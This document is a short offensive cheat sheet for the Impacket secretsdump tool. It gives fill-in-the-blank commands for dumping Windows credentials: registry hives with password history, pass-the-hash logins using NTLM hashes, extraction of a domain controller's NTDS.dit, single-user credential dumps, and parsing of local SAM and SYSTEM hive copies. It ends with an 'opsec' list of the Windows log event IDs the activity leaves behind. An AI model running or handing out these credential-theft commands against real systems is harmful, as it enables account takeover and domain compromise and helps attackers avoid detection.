### source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py  

### dump registry hives and other data
```
impacket-secretsdump -dc-ip <dcIp> <domain>/<user>:<password>@<rhost> -history
```

### using with pass the hash
```
impacket-secretsdump -hashes :<ntlmHash> -dc-ip <dcIp> <domain>/<user>@<rhost>
```

### dump only ntds.dit (can also use DRSGetNCCHanges Method)
```
impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost>
```

### dump credentials of single user
```
impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost> -just-dc-user <user>
```

### dump from local registry hive copies
```
impacket-secretsdump -system <systemFile> -sam <samFile> -security <securityFile> LOCAL
```

### dump from local system and ntds.dit
```
impacket-secretsdump -ntds <ntdsFile> -system system <systemFile>  LOCAL
```

### opsec considerations 
```
Windows Security Log Event IDs
-Logon (4624)
-Logoff (4634)
-Special Logon (4672)

Windows System Logs
Service Control Manager (7040) -> multiple
```

